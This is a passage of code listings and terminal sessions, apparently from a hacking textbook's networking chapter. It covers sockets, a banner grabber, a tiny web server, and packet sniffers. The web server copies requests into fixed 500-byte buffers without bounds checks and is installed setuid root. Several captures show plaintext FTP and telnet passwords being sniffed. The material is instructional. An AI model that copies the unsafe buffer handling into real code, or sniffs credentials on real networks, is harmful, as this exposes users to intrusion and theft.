["```\n/* Protocol families.  */\n#define PF_UNSPEC 0 /* Unspecified.  */\n#define PF_LOCAL  1 /* Local to host (pipes and file-domain).  */\n#define PF_UNIX   PF_LOCAL /* Old BSD name for PF_LOCAL.  */\n#define PF_FILE   PF_LOCAL /* Another nonstandard name for PF_LOCAL.  */\n#define PF_INET   2 /* IP protocol family.  */\n#define PF_AX25   3 /* Amateur Radio AX.25\\.  */\n#define PF_IPX    4 /* Novell Internet Protocol.  */\n#define PF_APPLETALK  5 /* Appletalk DDP.  */\n#define PF_NETROM 6 /* Amateur radio NetROM.  */\n#define PF_BRIDGE 7 /* Multiprotocol bridge.  */\n#define PF_ATMPVC 8 /* ATM PVCs.  */\n#define PF_X25    9 /* Reserved for X.25 project.  */\n#define PF_INET6  10  /* IP version 6\\.  */\n     ...\n```", "```\n/* Types of sockets.  */\nenum __socket_type\n{\n  SOCK_STREAM = 1,    /* Sequenced, reliable, connection-based byte streams.  */\n#define SOCK_STREAM SOCK_STREAM\n  SOCK_DGRAM = 2,   /* Connectionless, unreliable datagrams of fixed maximum length.  */\n#define SOCK_DGRAM SOCK_DGRAM\n\n  ...\n```", "```\n/* Get the definition of the macro to define the common sockaddr members.  */\n#include <bits/sockaddr.h>\n\n/* Structure describing a generic socket address. */\nstruct sockaddr\n  {\n    __SOCKADDR_COMMON (sa_);  /* Common data: address family and length.  */\n    char sa_data[14];   /* Address data.  */\n  };\n```", "```\n/* Address families.  */\n#define AF_UNSPEC PF_UNSPEC\n#define AF_LOCAL  PF_LOCAL\n#define AF_UNIX   PF_UNIX\n#define AF_FILE   PF_FILE\n#define AF_INET   PF_INET\n#define AF_AX25   PF_AX25\n#define AF_IPX    PF_IPX\n#define AF_APPLETALK  PF_APPLETALK\n#define AF_NETROM PF_NETROM\n#define AF_BRIDGE PF_BRIDGE\n#define AF_ATMPVC PF_ATMPVC\n#define AF_X25    PF_X25\n#define AF_INET6  PF_INET6\n     ...\n```", "```\n/* Structure describing an Internet socket address.  */\nstruct sockaddr_in\n  {\n    __SOCKADDR_COMMON (sin_);\n    in_port_t sin_port;     /* Port number.  */\n    struct in_addr sin_addr;    /* Internet address.  */\n\n    /* Pad to size of 'struct sockaddr'.  */\n    unsigned char sin_zero[sizeof (struct sockaddr) -\n         __SOCKADDR_COMMON_SIZE -\n         sizeof (in_port_t) -\n         sizeof (struct in_addr)];\n  };\n```", "```\n`inet_aton(char *ascii_addr, struct in_addr *network_addr)`\n```", "```\n`inet_ntoa(struct in_addr *network_addr)`\n```", "```\n// Dumps raw memory in hex byte and printable split format\nvoid dump(const unsigned char *data_buffer, const unsigned int length) {\n   unsigned char byte;\n   unsigned int i, j;\n   for(i=0; i < length; i++) {\n      byte = data_buffer[i];\n      printf(\"%02x \", data_buffer[i]);  // Display byte in hex.\n      if(((i%16)==15) || (i==length-1)) {\n         for(j=0; j < 15-(i%16); j++)\n            printf(\"   \");\n         printf(\"| \");\n         for(j=(i-(i%16)); j <= i; j++) {  // Display printable bytes from line.\n            byte = data_buffer[j];\n            if((byte > 31) && (byte < 127)) // Outside printable char range\n               printf(\"%c\", byte);\n            else\n               printf(\".\");\n         }\n         printf(\"\\n\"); // End of the dump line (each line is 16 bytes)\n      } // End if\n   } // End for\n}\n```", "```\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <sys/socket.h>\n#include <netinet/in.h>\n#include <arpa/inet.h>\n#include \"hacking.h\"\n\n#define PORT 7890 // The port users will be connecting to\n\nint main(void) {\n   int sockfd, new_sockfd;  // Listen on sock_fd, new connection on new_fd\n   struct sockaddr_in host_addr, client_addr;   // My address information\n   socklen_t sin_size;\n   int recv_length=1, yes=1;\n   char buffer[1024];\n\n   if ((sockfd = socket(PF_INET, SOCK_STREAM, 0)) == -1)\n      fatal(\"in socket\");\n\n   if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1)\n      fatal(\"setting socket option SO_REUSEADDR\");\n```", "```\n\thost_addr.sin_family = AF_INET;    // Host byte order\n\thost_addr.sin_port = htons(PORT);  // Short, network byte order\n\thost_addr.sin_addr.s_addr = 0; // Automatically fill with my IP.\n\tmemset(&(host_addr.sin_zero), '\\0', 8); // Zero the rest of the struct.\n\n\tif (bind(sockfd, (struct sockaddr *)&host_addr, sizeof(struct sockaddr)) == -1)\n\t  fatal(\"binding to socket\");\n\n\tif (listen(sockfd, 5) == -1) \n\t  fatal(\"listening on socket\");\n```", "```\nwhile(1) {    // Accept loop.\n      sin_size = sizeof(struct sockaddr_in);\n      new_sockfd = accept(sockfd, (struct sockaddr *)&client_addr, &sin_size);\n      if(new_sockfd == -1)\n         fatal(\"accepting connection\");\n      printf(\"server: got connection from %s port %d\\n\", \n              inet_ntoa(client_addr.sin_addr), ntohs(client_addr.sin_port));\n      send(new_sockfd, \"Hello, world!\\n\", 13, 0);\n      recv_length = recv(new_sockfd, &buffer, 1024, 0);\n      while(recv_length &gt; 0) {\n         printf(\"RECV: %d bytes\\n\", recv_length);\n         dump(buffer, recv_length);\n         recv_length = recv(new_sockfd, &buffer, 1024, 0);\n      }\n      close(new_sockfd);\n   }\n   return 0;\n}\n```", "```\nreader@hacking:~/booksrc $ gcc simple_server.c\nreader@hacking:~/booksrc $ ./a.out\n```", "```\nmatrix@euclid:~ $ telnet 192.168.42.248 7890\nTrying 192.168.42.248...\nConnected to 192.168.42.248.\nEscape character is '^]'.\nHello, world!\nthis is a test\nfjsghau;ehg;ihskjfhasdkfjhaskjvhfdkjhvbkjgf\n```", "```\nreader@hacking:~/booksrc $ ./a.out \nserver: got connection from 192.168.42.1 port 56971\nRECV: 16 bytes\n74 68 69 73 20 69 73 20 61 20 74 65 73 74 0d 0a | This is a test...\nRECV: 45 bytes\n66 6a 73 67 68 61 75 3b 65 68 67 3b 69 68 73 6b | fjsghau;ehg;ihsk\n6a 66 68 61 73 64 6b 66 6a 68 61 73 6b 6a 76 68 | jfhasdkfjhaskjvh\n66 64 6b 6a 68 76 62 6b 6a 67 66 0d 0a          | fdkjhvbkjgf...\n```", "```\nfinger    79/tcp        # Finger\nfinger    79/udp\nhttp      80/tcp    www www-http  # World Wide Web HTTP\n```", "```\nreader@hacking:~/booksrc $ telnet www.internic.net 80\nTrying 208.77.188.101...\nConnected to www.internic.net.\nEscape character is '^]'.\nHEAD / HTTP/1.0\n\nHTTP/1.1 200 OK\nDate: Fri, 14 Sep 2007 05:34:14 GMT\nServer: Apache/2.0.52 (CentOS)\nAccept-Ranges: bytes\nContent-Length: 6743\nConnection: close\nContent-Type: text/html; charset=UTF-8\n\nConnection closed by foreign host.\nreader@hacking:~/booksrc $\n```", "```\nreader@hacking:~/booksrc $ man ascii | egrep \"Hex|0A|0D\"\nReformatting ascii(7), please wait...\n       Oct   Dec   Hex   Char                        Oct   Dec   Hex   Char\n       012   10    0A    LF  '\\n' (new line)         112   74    4A    J\n       015   13    0D    CR  '\\r' (carriage ret)     115   77    4D    M\nreader@hacking:~/booksrc $\n```", "```\n/* This function accepts a socket FD and a ptr to the null terminated\n * string to send.  The function will make sure all the bytes of the\n * string are sent.  Returns 1 on success and 0 on failure.\n */\nint send_string(int sockfd, unsigned char *buffer) {\n   int sent_bytes, bytes_to_send;\n   bytes_to_send = strlen(buffer);\n   while(bytes_to_send > 0) {\n      sent_bytes = send(sockfd, buffer, bytes_to_send, 0);\n      if(sent_bytes == -1)\n         return 0; // Return 0 on send error.\n      bytes_to_send -= sent_bytes;\n      buffer += sent_bytes;\n   }\n   return 1; // Return 1 on success.\n}\n\n/* This function accepts a socket FD and a ptr to a destination\n * buffer.  It will receive from the socket until the EOL byte\n * sequence in seen.  The EOL bytes are read from the socket, but\n * the destination buffer is terminated before these bytes.\n * Returns the size of the read line (without EOL bytes).\n */\nint recv_line(int sockfd, unsigned char *dest_buffer) {\n#define EOL \"\\r\\n\" // End-of-line byte sequence\n#define EOL_SIZE 2\n   unsigned char *ptr;\n   int eol_matched = 0;\n\n   ptr = dest_buffer;\n   while(recv(sockfd, ptr, 1, 0) == 1) { // Read a single byte.\n      if(*ptr == EOL[eol_matched]) { // Does this byte match terminator?\n         eol_matched++;\n         if(eol_matched == EOL_SIZE) { // If all bytes match terminator,\n            *(ptr+1-EOL_SIZE) = '\\0'; // terminate the string.\n            return strlen(dest_buffer); // Return bytes received\n         }\n      } else {\n         eol_matched = 0;\n      }\n      ptr++; // Increment the pointer to the next byter.\n   }\n   return 0; // Didn't find the end-of-line characters.\n}\n```", "```\n/* Description of database entry for a single host.  */\nstruct hostent\n{\n  char *h_name;     /* Official name of host.  */\n  char **h_aliases;   /* Alias list.  */\n  int h_addrtype;   /* Host address type.  */\n  int h_length;     /* Length of address.  */\n  char **h_addr_list;   /* List of addresses from name server.  */\n#define h_addr  h_addr_list[0]  /* Address, for backward compatibility.  */\n};\n```", "```\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <sys/socket.h>\n#include <netinet/in.h>\n#include <arpa/inet.h>\n\n#include <netdb.h>\n\n#include \"hacking.h\"\n\nint main(int argc, char *argv[]) {\n   struct hostent *host_info;\n   struct in_addr *address;\n\n   if(argc < 2) {\n      printf(\"Usage: %s <hostname>\\n\", argv[0]);\n      exit(1);\n   }\n\n   host_info = gethostbyname(argv[1]);\n   if(host_info == NULL) {\n      printf(\"Couldn't lookup %s\\n\", argv[1]);\n   } else {\n      address = (struct in_addr *) (host_info->h_addr);\n      printf(\"%s has address %s\\n\", argv[1], inet_ntoa(*address));\n   }\n}\n```", "```\nreader@hacking:~/booksrc $ gcc -o host_lookup host_lookup.c \nreader@hacking:~/booksrc $ ./host_lookup www.internic.net\nwww.internic.net has address 208.77.188.101\nreader@hacking:~/booksrc $ ./host_lookup www.google.com\nwww.google.com has address 74.125.19.103 \nreader@hacking:~/booksrc $ \n```", "```\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <sys/socket.h>\n#include <netinet/in.h>\n#include <arpa/inet.h>\n#include <netdb.h>\n\n#include \"hacking.h\"\n#include \"hacking-network.h\"\n\nint main(int argc, char *argv[]) {\n   int sockfd;\n   struct hostent *host_info;\n   struct sockaddr_in target_addr;\n   unsigned char buffer[4096];\n\n   if(argc < 2) {\n      printf(\"Usage: %s <hostname>\\n\", argv[0]);\n      exit(1);\n   }\n\n   if((host_info = gethostbyname(argv[1])) == NULL)\n      fatal(\"looking up hostname\");\n\n   if ((sockfd = socket(PF_INET, SOCK_STREAM, 0)) == -1)\n      fatal(\"in socket\");\n\n   target_addr.sin_family = AF_INET;\n   target_addr.sin_port = htons(80);\n   target_addr.sin_addr = *((struct in_addr *)host_info->h_addr);\n   memset(&(target_addr.sin_zero), '\\0', 8); // Zero the rest of the struct.\n\n   if (connect(sockfd, (struct sockaddr *)&target_addr, sizeof(struct sockaddr)) == -1)\n      fatal(\"connecting to target server\");\n\n   send_string(sockfd, \"HEAD / HTTP/1.0\\r\\n\\r\\n\");\n   while(recv_line(sockfd, buffer)) {\n      if(strncasecmp(buffer, \"Server:\", 7) == 0) {\n         printf(\"The web server for %s is %s\\n\", argv[1], buffer+8);\n         exit(0);\n      }\n   }\n   printf(\"Server line not found\\n\");\n   exit(1);\n}\n```", "```\nreader@hacking:~/booksrc $ gcc -o webserver_id webserver_id.c\nreader@hacking:~/booksrc $ ./webserver_id www.internic.net\nThe web server for www.internic.net is Apache/2.0.52 (CentOS)\nreader@hacking:~/booksrc $ ./webserver_id www.microsoft.com\nThe web server for www.microsoft.com is Microsoft-IIS/7.0\nreader@hacking:~/booksrc $\n```", "```\n#include <stdio.h>\n#include <fcntl.h>\n#include <stdlib.h>\n#include <string.h>\n#include <sys/stat.h>\n#include <sys/socket.h>\n#include <netinet/in.h>\n#include <arpa/inet.h>\n#include \"hacking.h\"\n#include \"hacking-network.h\"\n\n#define PORT 80   // The port users will be connecting to\n#define WEBROOT \"./webroot\" // The web server's root directory\n\nvoid handle_connection(int, struct sockaddr_in *); // Handle web requests\nint get_file_size(int); // Returns the filesize of open file descriptor\n\nint main(void) {\n   int sockfd, new_sockfd, yes=1;\n   struct sockaddr_in host_addr, client_addr;   // My address information\n   socklen_t sin_size;\n\n   printf(\"Accepting web requests on port %d\\n\", PORT);\n\n   if ((sockfd = socket(PF_INET, SOCK_STREAM, 0)) == -1)\n      fatal(\"in socket\");\n\n   if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1)\n      fatal(\"setting socket option SO_REUSEADDR\");\n\n   host_addr.sin_family = AF_INET;      // Host byte order\n   host_addr.sin_port = htons(PORT);    // Short, network byte order\n   host_addr.sin_addr.s_addr = INADDR_ANY; // Automatically fill with my IP.\n   memset(&(host_addr.sin_zero), '\\0', 8); // Zero the rest of the struct.\n\n   if (bind(sockfd, (struct sockaddr *)&host_addr, sizeof(struct sockaddr)) == -1)\n      fatal(\"binding to socket\");\n\n   if (listen(sockfd, 20) == -1)\n      fatal(\"listening on socket\");\n\n   while(1) {   // Accept loop.\n      sin_size = sizeof(struct sockaddr_in);\n      new_sockfd = accept(sockfd, (struct sockaddr *)&client_addr, &sin_size);\n      if(new_sockfd == -1)\n         fatal(\"accepting connection\");\n\n      handle_connection(new_sockfd, &client_addr);\n   }\n   return 0;\n}\n\n/* This function handles the connection on the passed socket from the\n * passed client address.  The connection is processed as a web request,\n * and this function replies over the connected socket.  Finally, the\n * passed socket is closed at the end of the function.\n */\nvoid handle_connection(int sockfd, struct sockaddr_in *client_addr_ptr) {\n   unsigned char *ptr, request[500], resource[500];\n   int fd, length;\n\n   length = recv_line(sockfd, request);\n\n   printf(\"Got request from %s:%d \\\"%s\\\"\\n\", inet_ntoa(client_addr_ptr->sin_addr),\nntohs(client_addr_ptr->sin_port), request);\n\n   ptr = strstr(request, \" HTTP/\"); // Search for valid-looking request.\n   if(ptr == NULL) { // Then this isn't valid HTTP.\n      printf(\" NOT HTTP!\\n\");\n   } else {\n      *ptr = 0; // Terminate the buffer at the end of the URL.\n      ptr = NULL; // Set ptr to NULL (used to flag for an invalid request).\n      if(strncmp(request, \"GET \", 4) == 0)  // GET request\n         ptr = request+4; // ptr is the URL.\n      if(strncmp(request, \"HEAD \", 5) == 0) // HEAD request\n         ptr = request+5; // ptr is the URL.\n\n      if(ptr == NULL) { // Then this is not a recognized request.\n         printf(\"\\tUNKNOWN REQUEST!\\n\");\n      } else { // Valid request, with ptr pointing to the resource name\n         if (ptr[strlen(ptr) - 1] == '/')  // For resources ending with '/',\n            strcat(ptr, \"index.html\");     // add 'index.html' to the end.\n         strcpy(resource, WEBROOT);     // Begin resource with web root path\n         strcat(resource, ptr);         //  and join it with resource path.\n         fd = open(resource, O_RDONLY, 0); // Try to open the file.\n         printf(\"\\tOpening \\'%s\\'\\t\", resource);\n         if(fd == -1) { // If file is not found\n            printf(\" 404 Not Found\\n\");\n            send_string(sockfd, \"HTTP/1.0 404 NOT FOUND\\r\\n\");\n            send_string(sockfd, \"Server: Tiny webserver\\r\\n\\r\\n\");\n            send_string(sockfd, \"<html><head><title>404 Not Found</title></head>\");\n            send_string(sockfd, \"<body><h1>URL not found</h1></body></html>\\r\\n\");\n         } else {      // Otherwise, serve up the file.\n            printf(\" 200 OK\\n\");\n            send_string(sockfd, \"HTTP/1.0 200 OK\\r\\n\");\n            send_string(sockfd, \"Server: Tiny webserver\\r\\n\\r\\n\");\n            if(ptr == request + 4) { // Then this is a GET request\n               if( (length = get_file_size(fd)) == -1)\n                  fatal(\"getting resource file size\");\n               if( (ptr = (unsigned char *) malloc(length)) == NULL)\n                  fatal(\"allocating memory for reading resource\");\n               read(fd, ptr, length); // Read the file into memory.\n               send(sockfd, ptr, length, 0);  // Send it to socket.\n               free(ptr); // Free file memory.\n            }\n            close(fd); // Close the file.\n         } // End if block for file found/not found.\n      } // End if block for valid request.\n   } // End if block for valid HTTP.\n   shutdown(sockfd, SHUT_RDWR); // Close the socket gracefully.\n}\n\n/* This function accepts an open file descriptor and returns\n * the size of the associated file.  Returns -1 on failure.\n */\nint get_file_size(int fd) {\n   struct stat stat_struct;\n\n   if(fstat(fd, &stat_struct) == -1)\n      return -1;\n   return (int) stat_struct.st_size;\n}\n```", "```\nreader@hacking:~/booksrc $ ls -l webroot/\ntotal 52\n-rwxr--r-- 1 reader reader 46794 2007-05-28 23:43 image.jpg\n-rw-r--r-- 1 reader reader   261 2007-05-28 23:42 index.html\nreader@hacking:~/booksrc $ cat webroot/index.html \n<html>\n<head><title>A sample webpage</title></head>\n<body bgcolor=\"#000000\" text=\"#ffffffff\">\n<center>\n<h1>This is a sample webpage</h1>\n...and here is some sample text<br>\n<br>\n..and even a sample image:<br>\n<img src=\"image.jpg\"><br>\n</center>\n</body>\n</html>\nreader@hacking:~/booksrc $ gcc -o tinyweb tinyweb.c\nreader@hacking:~/booksrc $ sudo chown root ./tinyweb\nreader@hacking:~/booksrc $ sudo chmod u+s ./tinyweb\nreader@hacking:~/booksrc $ ./tinyweb\nAccepting web requests on port 80\nGot request from 127.0.0.1:52996 \"GET / HTTP/1.1\"\n        Opening './webroot/index.html'   200 OK\nGot request from 127.0.0.1:52997 \"GET /image.jpg HTTP/1.1\"\n        Opening './webroot/image.jpg'    200 OK\nGot request from 127.0.0.1:52998 \"GET /favicon.ico HTTP/1.1\"\n        Opening './webroot/favicon.ico' 404 Not Found\n```", "```\n[Page 10]\nSeptember 1981\n                                                       Internet Protocol\n                           3\\.  SPECIFICATION\n\n3.1\\.  Internet Header Format\n\n  A summary of the contents of the internet header follows:\n\n    0                   1                   2                   3\n    0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1\n   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n   |Version|  IHL  |Type of Service|          Total Length         |\n   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n   |         Identification        |Flags|      Fragment Offset    |\n   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n   |  Time to Live |    Protocol   |         Header Checksum       |\n   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n   |                       Source Address                          |\n   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n   |                    Destination Address                        |\n   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n   |                    Options                    |    Padding    |\n   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n\n                    Example Internet Datagram Header\n\n                               Figure 4.\nNote that each tick mark represents one bit position.\n```", "```\n[Page 14]\n\nSeptember 1981\n                                           Transmission Control Protocol\n\n                      3\\.  FUNCTIONAL SPECIFICATION\n\n3.1\\.  Header Format\n\n  TCP segments are sent as internet datagrams.  The Internet Protocol\n  header carries several information fields, including the source and\n  destination host addresses [2].  A TCP header follows the internet\n  header, supplying information specific to the TCP protocol.  This\n  division allows for the existence of host level protocols other than\n  TCP.\n\n  TCP Header Format\n\n    0                   1                   2                   3\n    0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1\n   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n   |          Source Port          |       Destination Port        |\n   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n   |                        Sequence Number                        |\n   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n   |                    Acknowledgment Number                      |\n   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n   |  Data |           |U|A|P|R|S|F|                               |\n   | Offset| Reserved  |R|C|S|S|Y|I|            Window             |\n   |       |           |G|K|H|T|N|N|                               |\n   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n   |           Checksum            |         Urgent Pointer        |\n   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n   |                    Options                    |    Padding    |\n   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n   |                             data                              |\n   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n\n                            TCP Header Format\n\n          Note that one tick mark represents one bit position.\n\n                               Figure 3.\n```", "```\nreader@hacking:~/booksrc $ ifconfig eth0\neth0      Link encap:Ethernet  HWaddr 00:0C:29:34:61:65\n          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1\n          RX packets:17115 errors:0 dropped:0 overruns:0 frame:0\n          TX packets:1927 errors:0 dropped:0 overruns:0 carrier:0\n          collisions:0 txqueuelen:1000\n          RX bytes:4602913 (4.3 MiB)  TX bytes:434449 (424.2 KiB)\n          Interrupt:16 Base address:0x2024\n\nreader@hacking:~/booksrc $ sudo ifconfig eth0 promisc\nreader@hacking:~/booksrc $ ifconfig eth0\neth0      Link encap:Ethernet  HWaddr 00:0C:29:34:61:65\n          UP BROADCAST RUNNING PROMISC MULTICAST  MTU:1500  Metric:1\n          RX packets:17181 errors:0 dropped:0 overruns:0 frame:0\n          TX packets:1927 errors:0 dropped:0 overruns:0 carrier:0\n          collisions:0 txqueuelen:1000\n          RX bytes:4668475 (4.4 MiB)  TX bytes:434449 (424.2 KiB)\n\n          Interrupt:16 Base address:0x2024\n\nreader@hacking:~/booksrc $\n```", "```\nreader@hacking:~/booksrc $ sudo tcpdump -l -X 'ip host 192.168.0.118'\ntcpdump: listening on eth0\n21:27:44.684964 192.168.0.118.ftp > 192.168.0.193.32778: P 1:42(41) ack 1 win\n17316 <nop,nop,timestamp 466808 920202> (DF)\n0x0000   4500 005d e065 4000 8006 97ad c0a8 0076        E..].e@........v\n0x0010   c0a8 00c1 0015 800a 292e 8a73 5ed4 9ce8        ........)..s^...\n0x0020   8018 43a4 a12f 0000 0101 080a 0007 1f78        ..C../.........x\n0x0030   000e 0a8a 3232 3020 5459 5053 6f66 7420        ....220.TYPSoft.\n0x0040   4654 5020 5365 7276 6572 2030 2e39 392e        FTP.Server.0.99.\n0x0050   3133                                           13\n21:27:44.685132 192.168.0.193.32778 > 192.168.0.118.ftp: . ack 42 win 5840\n<nop,nop,timestamp 920662 466808> (DF) [tos 0x10]\n0x0000   4510 0034 966f 4000 4006 21bd c0a8 00c1        E..4.o@.@.!.....\n0x0010   c0a8 0076 800a 0015 5ed4 9ce8 292e 8a9c        ...v....^...)...\n0x0020   8010 16d0 81db 0000 0101 080a 000e 0c56        ...............V\n0x0030   0007 1f78                                      ...x\n21:27:52.406177 192.168.0.193.32778 > 192.168.0.118.ftp: P 1:13(12) ack 42 win\n5840 <nop,nop,timestamp 921434 466808> (DF) [tos 0x10]\n0x0000   4510 0040 9670 4000 4006 21b0 c0a8 00c1        E..@.p@.@.!.....\n0x0010   c0a8 0076 800a 0015 5ed4 9ce8 292e 8a9c        ...v....^...)...\n0x0020   8018 16d0 edd9 0000 0101 080a 000e 0f5a        ...............Z\n0x0030   0007 1f78 5553 4552 206c 6565 6368 0d0a        ...xUSER`.leech..`\n21:27:52.415487 192.168.0.118.ftp > 192.168.0.193.32778: P 42:76(34) ack 13\nwin 17304 <nop,nop,timestamp 466885 921434> (DF)\n0x0000   4500 0056 e0ac 4000 8006 976d c0a8 0076        E..V..@....m...v\n0x0010   c0a8 00c1 0015 800a 292e 8a9c 5ed4 9cf4        ........)...^...\n0x0020   8018 4398 4e2c 0000 0101 080a 0007 1fc5        ..C.N,..........\n0x0030   000e 0f5a 3333 3120 5061 7373 776f 7264        ...Z331.Password\n0x0040   2072 6571 7569 7265 6420 666f 7220 6c65        .required.for.le\n0x0050   6563                                           ec\n21:27:52.415832 192.168.0.193.32778 > 192.168.0.118.ftp: . ack 76 win 5840\n<nop,nop,timestamp 921435 466885> (DF) [tos 0x10]\n0x0000   4510 0034 9671 4000 4006 21bb c0a8 00c1        E..4.q@.@.!.....\n0x0010   c0a8 0076 800a 0015 5ed4 9cf4 292e 8abe        ...v....^...)...\n0x0020   8010 16d0 7e5b 0000 0101 080a 000e 0f5b        ....~[.........[\n0x0030   0007 1fc5                                      ....\n21:27:56.155458 192.168.0.193.32778 > 192.168.0.118.ftp: P 13:27(14) ack 76\nwin 5840 <nop,nop,timestamp 921809 466885> (DF) [tos 0x10]\n0x0000   4510 0042 9672 4000 4006 21ac c0a8 00c1        E..B.r@.@.!.....\n0x0010   c0a8 0076 800a 0015 5ed4 9cf4 292e 8abe        ...v....^...)...\n0x0020   8018 16d0 90b5 0000 0101 080a 000e 10d1        ................\n0x0030   0007 1fc5 5041 5353 206c 3840 6e69 7465        ....PASS.`l8@nite`\n0x0040   0d0a                                           ..\n21:27:56.179427 192.168.0.118.ftp > 192.168.0.193.32778: P 76:103(27) ack 27\nwin 17290 <nop,nop,timestamp 466923 921809> (DF)\n0x0000   4500 004f e0cc 4000 8006 9754 c0a8 0076        E..O..@....T...v\n0x0010   c0a8 00c1 0015 800a 292e 8abe 5ed4 9d02        ........)...^...\n0x0020   8018 438a 4c8c 0000 0101 080a 0007 1feb        ..C.L...........\n0x0030   000e 10d1 3233 3020 5573 6572 206c 6565        ....230.User.lee\n0x0040   6368 206c 6f67 6765 6420 696e 2e0d 0a          ch.logged.in...\n```", "```\nreader@hacking:~/booksrc $ sudo dsniff -n\ndsniff: listening on eth0\n-----------------\n12/10/02 21:43:21 tcp 192.168.0.193.32782 -> 192.168.0.118.21 (ftp)\nUSER leech\nPASS l8@nite\n\n-----------------\n12/10/02 21:47:49 tcp 192.168.0.193.32785 -> 192.168.0.120.23 (telnet)\nUSER root \nPASS 5eCr3t\n```", "```\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <sys/socket.h>\n#include <netinet/in.h>\n#include <arpa/inet.h>\n\n#include \"hacking.h\"\n\nint main(void) {\n   int i, recv_length, sockfd;\n\n   u_char buffer[9000];\n\n   if ((sockfd = socket(PF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)\n      fatal(\"in socket\");\n\n   for(i=0; i < 3; i++) {\n      recv_length = recv(sockfd, buffer, 8000, 0);\n      printf(\"Got a %d byte packet\\n\", recv_length);\n      dump(buffer, recv_length);\n   }\n}\n```", "```\nreader@hacking:~/booksrc $ gcc -o raw_tcpsniff raw_tcpsniff.c\nreader@hacking:~/booksrc $ ./raw_tcpsniff\n[!!] Fatal Error in socket: Operation not permitted\nreader@hacking:~/booksrc $ sudo ./raw_tcpsniff\nGot a 68 byte packet\n45 10 00 44 1e 36 40 00 40 06 46 23 c0 a8 2a 01 | E..D.6@.@.F#..*.\nc0 a8 2a f9 8b 12 1e d2 ac 14 cf 92 e5 10 6c c9 | ..*...........l.\n80 18 05 b4 32 47 00 00 01 01 08 0a 26 ab 9a f1 | ....2G......&...\n02 3b 65 b7 74 68 69 73 20 69 73 20 61 20 74 65 | .;e.this is a te\n73 74 0d 0a                                     | st..\nGot a 70 byte packet\n45 10 00 46 1e 37 40 00 40 06 46 20 c0 a8 2a 01 | E..F.7@.@.F ..*.\nc0 a8 2a f9 8b 12 1e d2 ac 14 cf a2 e5 10 6c c9 | ..*...........l.\n80 18 05 b4 27 95 00 00 01 01 08 0a 26 ab a0 75 | ....'.......&..u\n02 3c 1b 28 41 41 41 41 41 41 41 41 41 41 41 41 | .<.(AAAAAAAAAAAA\n41 41 41 41 0d 0a                               | AAAA..\nGot a 71 byte packet\n45 10 00 47 1e 38 40 00 40 06 46 1e c0 a8 2a 01 | E..G.8@.@.F...*.\nc0 a8 2a f9 8b 12 1e d2 ac 14 cf b4 e5 10 6c c9 | ..*...........l.\n80 18 05 b4 68 45 00 00 01 01 08 0a 26 ab b6 e7 | ....hE......&...\n02 3c 20 ad 66 6a 73 64 61 6c 6b 66 6a 61 73 6b | .< .fjsdalkfjask\n66 6a 61 73 64 0d 0a                            | fjasd..\nreader@hacking:~/booksrc $\n```", "```\n#include <pcap.h>\n#include \"hacking.h\"\n\nvoid pcap_fatal(const char *failed_in, const char *errbuf) {\n   printf(\"Fatal Error in %s: %s\\n\", failed_in, errbuf);\n   exit(1); \n}\n```", "```\nint main() {\n   struct pcap_pkthdr header;\n   const u_char *packet;\n   char errbuf[PCAP_ERRBUF_SIZE];\n   char *device;\n   pcap_t *pcap_handle;\n   int i;\n```", "```\ndevice = pcap_lookupdev(errbuf);\nif(device == NULL)\n   pcap_fatal(\"pcap_lookupdev\", errbuf);\n\nprintf(\"Sniffing on device %s\\n\", device);\n```", "```\npcap_handle = pcap_open_live(device, 4096, 1, 0, errbuf);\nif(pcap_handle == NULL)\n   pcap_fatal(\"pcap_open_live\", errbuf);\n```", "```\nfor(i=0; i < 3; i++) {\n      packet = pcap_next(pcap_handle, &header);\n      printf(\"Got a %d byte packet\\n\", header.len);\n      dump(packet, header.len);\n   }\n   pcap_close(pcap_handle);\n}\n```", "```\nreader@hacking:~/booksrc $ gcc -o pcap_sniff 